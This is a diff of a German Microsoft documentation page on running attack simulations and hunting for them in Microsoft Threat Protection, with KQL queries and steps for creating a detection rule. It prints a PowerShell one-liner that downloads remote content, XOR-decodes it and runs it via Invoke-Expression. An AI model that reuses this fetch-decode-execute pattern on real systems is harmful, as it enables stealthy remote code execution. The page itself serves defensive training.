@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: de-DE
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368093"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418145"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>Ausführen von Microsoft Threat Protection-Angriffssimulationen  
 
@@ -92,21 +93,23 @@ Während der Simulation injiziert der Angriff Shellcode in einen scheinbar unsch
 Da Sie die Pilotumgebung bereits während der Vorbereitungsphase konfiguriert haben, stellen Sie sicher, dass Sie über zwei Geräte für dieses Szenario verfügen: ein Test Gerät und einen Domänencontroller.
 
 1.  Stellen Sie sicher, dass Ihr Mandant [Microsoft Threat Protection-Schutz aktiviert](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)hat.
+
 2.  Überprüfen Sie die Konfiguration des Testdomänen Controllers:
+
     - Das Gerät wird mit Windows Server 2008 R2 oder einer höheren Version ausgeführt.
     - Der Testdomänencontroller auf [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) und Aktivieren der [Remoteverwaltung](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).    
     - Stellen Sie sicher, dass die [Azure ATP-und die Microsoft Cloud-App-Sicherheitsintegration](https://docs.microsoft.com/cloud-app-security/aatp-integration) aktiviert wurden.
     - In Ihrer Domäne wird ein Testbenutzer erstellt – es sind keine Administratorberechtigungen erforderlich.
 
 3.  Überprüfen der Konfiguration der Testgeräte:
-    <br>
-    a.  Das Gerät wird mit Windows 10 Version 1903 oder einer höheren Version ausgeführt.
-    <br>
-    b.  Das Test Gerät ist der Testdomäne beigetreten.
-    <br>
-    c.  [Aktivieren Sie Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie dieses [Thema zur Problembehandlung](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
-    <br>
-    d.  Stellen Sie sicher, dass das Testgerät [auf Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)fest vorliegt.
+ 
+    1.  Das Gerät wird mit Windows 10 Version 1903 oder einer höheren Version ausgeführt.
+    
+    1.  Das Test Gerät ist der Testdomäne beigetreten.
+    
+    1.  [Aktivieren Sie Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie dieses [Thema zur Problembehandlung](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
+    
+    1.  Stellen Sie sicher, dass das Testgerät [auf Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)fest vorliegt.
 
 Wenn Sie einen vorhandenen Mandanten verwenden und Gerätegruppen implementieren, erstellen Sie eine dedizierte Gerätegruppe für das Test Gerät, und drücken Sie Sie in der Konfigurations-UX auf die oberste Ebene.
 
@@ -120,15 +123,17 @@ So führen Sie die Angriffsszenario-Simulation aus:
 2.  Öffnen Sie auf dem Test Gerät ein Windows PowerShell Fenster.
 
 3.  Kopieren Sie das folgende Simulations Skript:
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->Wenn Sie dieses Dokument in einem Webbrowser öffnen, können Probleme beim Kopieren des vollständigen Texts auftreten, ohne dass bestimmte Zeichen verloren gehen oder zusätzliche Zeilenumbrüche eingeführt werden. Laden Sie dieses Dokument herunter, und öffnen Sie es in Adobe Reader.
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > Wenn Sie dieses Dokument in einem Webbrowser öffnen, können Probleme beim Kopieren des vollständigen Texts auftreten, ohne dass bestimmte Zeichen verloren gehen oder zusätzliche Zeilenumbrüche eingeführt werden. Laden Sie dieses Dokument herunter, und öffnen Sie es in Adobe Reader.
 
 4. Fügen Sie an der Eingabeaufforderung das kopierte Skript ein, und führen Sie es aus.
 
@@ -141,7 +146,7 @@ Der simulierte Angriffscode versucht, mit einer externen IP-Adresse (simulieren 
 
 Wenn dieses Skript abgeschlossen ist, wird in der PowerShell-Konsole eine Meldung angezeigt.
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Für dieses Szenario ist ein einzelnes internes Postfach und Gerät erforderlich
 
 **Jagd gehen**
 1.  Öffnen Sie das Security.Microsoft.com-Portal.
+
 2.  Navigieren Sie zu **Hunting > Advanced Hunting**.
 
     ![Screenshot der erweiterten Suche in der Navigationsleiste des M365 Security Center-Portals](../../media/mtp/fig17.png) 
 
 3.  Erstellen Sie eine Abfrage, die mit dem Erfassen von e-Mail-Ereignissen beginnt.
-    a.  Wählen Sie im Bereich Abfrage die Option neu aus.
-    b.  Doppelklicken Sie auf die EmailEvents-Tabelle aus dem Schema.
 
-```
-EmailEvents 
-```                                        
+    1.  Wählen Sie im Bereich Abfrage die Option neu aus.
+    
+    1.  Doppelklicken Sie auf die EmailEvents-Tabelle aus dem Schema.
 
-   c.   Ändern Sie den Zeitrahmen in die letzten 24 Stunden. Angenommen, die e-Mail, die Sie beim Ausführen der obigen Simulation gesendet haben, war in den letzten 24 Stunden, andernfalls ändern Sie den Zeitrahmen.
-   ![Screenshot des Zeitraums, in dem Sie den Zeitrahmen ändern können. Öffnen des Dropdownmenüs zum Auswählen eines Bereichs von Zeitrahmen Optionen](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  Ändern Sie den Zeitrahmen in die letzten 24 Stunden. Angenommen, die e-Mail, die Sie beim Ausführen der obigen Simulation gesendet haben, war in den letzten 24 Stunden, andernfalls ändern Sie den Zeitrahmen.
+    
+        ![Screenshot des Zeitraums, in dem Sie den Zeitrahmen ändern können. Öffnen des Dropdownmenüs zum Auswählen eines Bereichs von Zeitrahmen Optionen](../../media/mtp/fig18.png) 
 
-   d.   Führen Sie die Abfrage aus.  Je nach Umgebung für das Pilotprojekt haben Sie möglicherweise viele Ergebnisse.  
+    1.  Führen Sie die Abfrage aus.  Je nach Umgebung für das Pilotprojekt haben Sie möglicherweise viele Ergebnisse.  
 
->[!NOTE]
->Weitere Informationen finden Sie im nächsten Schritt zum Filtern von Optionen zum Einschränken der Datenrückgabe.
+        > [!NOTE]
+        > Weitere Informationen finden Sie im nächsten Schritt zum Filtern von Optionen zum Einschränken der Datenrückgabe.
 
-   ![Screenshot der erweiterten Jagd Abfrageergebnisse](../../media/mtp/fig19.png) 
+        ![Screenshot der erweiterten Jagd Abfrageergebnisse](../../media/mtp/fig19.png) 
 
->[!NOTE]
->Erweiterte Suche zeigt Abfrageergebnisse als tabellarische Daten an. Sie können auch entscheiden, die Daten in anderen Formattypen wie Diagrammen anzuzeigen.    
+        > [!NOTE]
+        > Erweiterte Suche zeigt Abfrageergebnisse als tabellarische Daten an. Sie können auch entscheiden, die Daten in anderen Formattypen wie Diagrammen anzuzeigen.    
 
-   e.   Sehen Sie sich die Ergebnisse an, und prüfen Sie, ob Sie die geöffnete e-Mail identifizieren können.  Es kann bis zu 2 Stunden dauern, bis die Nachricht in Advanced Hunting angezeigt wird. Wenn die e-Mail-Umgebung groß ist und viele Ergebnisse vorliegen, möchten Sie möglicherweise die **Option Filter anzeigen** verwenden, um nach der Nachricht zu suchen. 
+    1.  Sehen Sie sich die Ergebnisse an, und prüfen Sie, ob Sie die geöffnete e-Mail identifizieren können.  Es kann bis zu 2 Stunden dauern, bis die Nachricht in Advanced Hunting angezeigt wird. Wenn die e-Mail-Umgebung groß ist und viele Ergebnisse vorliegen, möchten Sie möglicherweise die **Option Filter anzeigen** verwenden, um nach der Nachricht zu suchen. 
 
-   Im Beispiel wurde die e-Mail von einem Yahoo-Konto gesendet. Klicken Sie auf das **+** Symbol neben **Yahoo.com** im Abschnitt SenderFromDomain, und klicken Sie dann auf über **nehmen** , um die ausgewählte Domäne zur Abfrage hinzuzufügen.  Sie sollten die Domäne oder das e-Mail-Konto verwenden, das zum Senden der Testnachricht in Schritt 1 von Ausführen der Simulation verwendet wurde, um die Ergebnisse zu filtern.  Führen Sie die Abfrage erneut aus, um ein kleineres Resultset zu erhalten, um zu überprüfen, ob die Nachricht aus der Simulation angezeigt wird.
+        Im Beispiel wurde die e-Mail von einem Yahoo-Konto gesendet. Klicken Sie auf das **+** Symbol neben **Yahoo.com** im Abschnitt SenderFromDomain, und klicken Sie dann auf über **nehmen** , um die ausgewählte Domäne zur Abfrage hinzuzufügen.  Sie sollten die Domäne oder das e-Mail-Konto verwenden, das zum Senden der Testnachricht in Schritt 1 von Ausführen der Simulation verwendet wurde, um die Ergebnisse zu filtern.  Führen Sie die Abfrage erneut aus, um ein kleineres Resultset zu erhalten, um zu überprüfen, ob die Nachricht aus der Simulation angezeigt wird.
    
-   ![Screenshot der Filter. Verwenden Sie Filter, um die Suche einzugrenzen, und suchen Sie schneller nach Ihren Wünschen.](../../media/mtp/fig20.png) 
+        ![Screenshot der Filter. Verwenden Sie Filter, um die Suche einzugrenzen, und suchen Sie schneller nach Ihren Wünschen.](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   Klicken Sie auf die resultierenden Zeilen aus der Abfrage, damit Sie den Datensatz überprüfen können.
-   ![Screenshot des Seitenbereichs "inspizieren des Datensatzes", der geöffnet wird, wenn ein erweitertes Jagd Ergebnis ausgewählt wird](../../media/mtp/fig21.png) 
-
+    1.  Klicken Sie auf die resultierenden Zeilen aus der Abfrage, damit Sie den Datensatz überprüfen können.
+   
+        ![Screenshot des Seitenbereichs "inspizieren des Datensatzes", der geöffnet wird, wenn ein erweitertes Jagd Ergebnis ausgewählt wird](../../media/mtp/fig21.png) 
 
 4.  Nachdem Sie nun überprüft haben, dass die e-Mail angezeigt werden kann, fügen Sie einen Filter für die Anlagen hinzu. Konzentrieren Sie sich auf alle e-Mails mit Anlagen in der Umgebung. Konzentrieren Sie sich in diesem Szenario auf eingehende e-Mails, nicht auf diejenigen, die aus Ihrer Umgebung gesendet werden. Entfernen Sie alle Filter, die Sie zum Auffinden Ihrer Nachricht hinzugefügt haben, und fügen Sie "| wobei **AttachmentCount > 0** und **EmailDirection**  ==  **"eingehend"** "
 
-In der folgenden Abfrage wird das Ergebnis mit einer kürzeren Liste als die anfängliche Abfrage für alle e-Mail-Ereignisse angezeigt:
+    In der folgenden Abfrage wird das Ergebnis mit einer kürzeren Liste als die anfängliche Abfrage für alle e-Mail-Ereignisse angezeigt:
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  Geben Sie als nächstes die Informationen über die Anlage (beispielsweise: Dateiname, Hashwerte) zu Ihrem Resultset hinzu. Um dies zu tun, fügen Sie die **EmailAttachmentInfo** -Tabelle. Die für den Beitritt zu verwendenden allgemeinen Felder sind in diesem Fall **NetworkMessageId** und **RecipientObjectId**.
 
-Die folgende Abfrage enthält auch eine zusätzliche Verbindung "| **Project-Rename EmailTimestamp = Timestamp**", mit dem ermittelt werden kann, welcher Zeitstempel im Zusammenhang mit den im nächsten Schritt hinzugefügten e-Mail-und Timestamps im Zusammenhang mit Dateiaktionen steht.
+    Die folgende Abfrage enthält auch eine zusätzliche Verbindung "| **Project-Rename EmailTimestamp = Timestamp**", mit dem ermittelt werden kann, welcher Zeitstempel im Zusammenhang mit den im nächsten Schritt hinzugefügten e-Mail-und Timestamps im Zusammenhang mit Dateiaktionen steht.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  Verwenden Sie als nächstes den **SHA256** -Wert aus der **EmailAttachmentInfo** -Tabelle, um **DeviceFileEvents** (Dateiaktionen, die auf dem Endpunkt passiert sind) für diesen Hash zu suchen.  Das allgemeine Feld hier ist der SHA256-Hash für die Anlage.
 
-Die resultierende Tabelle enthält nun Details vom Endpunkt (Microsoft Defender ATP) wie Gerätename, welche Aktion (in diesem Fall gefiltert, sodass nur filecreated-Ereignisse enthalten sind) und wo die Datei gespeichert wurde. Der dem Prozess zugeordnete Kontoname wird ebenfalls einbezogen.
+    Die resultierende Tabelle enthält nun Details vom Endpunkt (Microsoft Defender ATP) wie Gerätename, welche Aktion (in diesem Fall gefiltert, sodass nur filecreated-Ereignisse enthalten sind) und wo die Datei gespeichert wurde. Der dem Prozess zugeordnete Kontoname wird ebenfalls einbezogen.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-Sie haben jetzt eine Abfrage erstellt, mit der alle eingehenden e-Mails identifiziert werden, bei denen der Benutzer die Anlage geöffnet oder gespeichert hat. Sie können diese Abfrage auch verfeinern, um nach bestimmten Sender Domänen, Dateigrößen, Dateitypen usw. zu filtern.
+    Sie haben jetzt eine Abfrage erstellt, mit der alle eingehenden e-Mails identifiziert werden, bei denen der Benutzer die Anlage geöffnet oder gespeichert hat. Sie können diese Abfrage auch verfeinern, um nach bestimmten Sender Domänen, Dateigrößen, Dateitypen usw. zu filtern.
 
 7.  Funktionen sind eine besondere Art von Join, mit der Sie mehr TI-Daten zu einer Datei abrufen können, beispielsweise die Prävalenz, die Signaturgeber-und Ausstellerinformationen usw.  Um weitere Details zu der Datei zu erhalten, verwenden Sie die **fileprofile ()** -Funktion Bereicherung:
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **Erstellen einer Erkennung**
@@ -435,15 +442,15 @@ Bei benutzerdefinierten Erkennungen wird die Abfrage entsprechend der von Ihnen 
     
     ![Screenshot, auf dem Sie auf der Seite "Erweiterte Suche" auf Erkennungsregel erstellen klicken können](../../media/mtp/fig22.png) 
 
->[!NOTE]
->Wenn Sie auf **Erkennungsregel erstellen** klicken und in ihrer Abfragesyntax Fehler vorliegen, wird die Erkennungsregel nicht gespeichert. Überprüfen Sie Ihre Abfrage doppelt, um sicherzustellen, dass keine Fehler vorliegen. 
+    > [!NOTE]
+    > Wenn Sie auf **Erkennungsregel erstellen** klicken und in ihrer Abfragesyntax Fehler vorliegen, wird die Erkennungsregel nicht gespeichert. Überprüfen Sie Ihre Abfrage doppelt, um sicherzustellen, dass keine Fehler vorliegen. 
 
 
 2.  Füllen Sie die erforderlichen Felder mit den Informationen aus, mit denen das Sicherheitsteam die Warnung verstehen kann, warum es generiert wurde und welche Aktionen von Ihnen erwartet werden. 
 
     ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Warnungsdetails definieren können](../../media/mtp/fig23.png)
 
-Stellen Sie sicher, dass Sie die Felder mit Klarheit ausfüllen, um dem nächsten Benutzer eine fundierte Entscheidung über diese Warnungsregel Warnung zu geben. 
+    Stellen Sie sicher, dass Sie die Felder mit Klarheit ausfüllen, um dem nächsten Benutzer eine fundierte Entscheidung über diese Warnungsregel Warnung zu geben. 
 
 3.  Wählen Sie aus, welche Entitäten in dieser Warnung betroffen sind. Wählen Sie in diesem Fall **Gerät** und **Postfach**aus.
 
@@ -458,7 +465,7 @@ Stellen Sie sicher, dass Sie die Felder mit Klarheit ausfüllen, um dem nächste
 
     ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie den Bereich für die Warnungsregel festlegen können, verwaltet Ihre Erwartungen für die Ergebnisse, die angezeigt werden.](../../media/mtp/fig26.png) 
 
-Für dieses Pilotprojekt können Sie diese Regel auf eine Teilmenge der Testgeräte in Ihrer Produktionsumgebung beschränken.
+    Für dieses Pilotprojekt können Sie diese Regel auf eine Teilmenge der Testgeräte in Ihrer Produktionsumgebung beschränken.
 
 6.  Wählen Sie **Erstellen** aus. Wählen Sie dann im Navigationsbereich **benutzerdefinierte Erkennungsregeln** aus.
  
@@ -466,9 +473,9 @@ Für dieses Pilotprojekt können Sie diese Regel auf eine Teilmenge der Testger�
 
     ![Screenshot der Seite mit den Erkennungsregeln, auf der die Details zur Regel und zur Ausführung angezeigt werden](../../media/mtp/fig27b.png) 
 
-Auf dieser Seite können Sie die Erkennungsregel auswählen, mit der eine Detailseite geöffnet wird. 
+    Auf dieser Seite können Sie die Erkennungsregel auswählen, mit der eine Detailseite geöffnet wird. 
 
-![Screenshot der Seite "e-Mail-Anlagen", auf der Sie den Status der Regelausführung, ausgelöste Warnungen und Aktionen, Bearbeiten der Erkennung usw. sehen können](../../media/mtp/fig28.png) 
+    ![Screenshot der Seite "e-Mail-Anlagen", auf der Sie den Status der Regelausführung, ausgelöste Warnungen und Aktionen, Bearbeiten der Erkennung usw. sehen können](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>Zusätzliche erweiterte Jagd-Übungsschritte
 
@@ -477,7 +484,7 @@ Wenn Sie mehr über Advanced Hunting erfahren möchten, werden die folgenden Web
 >[!NOTE]
 >Lassen Sie sich mit Ihrem eigenen GitHub-Konto vorbereiten, um die Jagd Abfragen in ihrer Pilot Test Lab-Umgebung auszuführen.  
 
-| **Titel** | **Beschreibung** | **MP4 herunterladen** | **In YouTube ansehen** | **Zu verwendende CSL-Datei** |
+|  Titel  |  Beschreibung  |  MP4 herunterladen  |  In YouTube ansehen  |  Zu verwendende CSL-Datei  |
 |:-----|:-----|:-----|:-----|:-----|
 | Episode 1: KQL-Grundlagen | Wir behandeln die Grundlagen der erweiterten Jagd Funktionen in Microsoft Threat Protection. Erfahren Sie mehr über verfügbare erweiterte Jagd Daten und grundlegende KQL-Syntax und Operatoren. | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [Episode 1: CSL-Datei in git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | Episode 2: Joins | Wir werden weiterhin über Daten in der erweiterten Suche und darüber, wie Sie Tabellen miteinander verknüpfen, vertraut gemacht. Erfahren Sie mehr über inner-, Outer-, Unique-und semi-Joins und die Nuancen der standardmäßigen Kusto innerunique Join. | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [Episode 2: CSL-Datei in git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
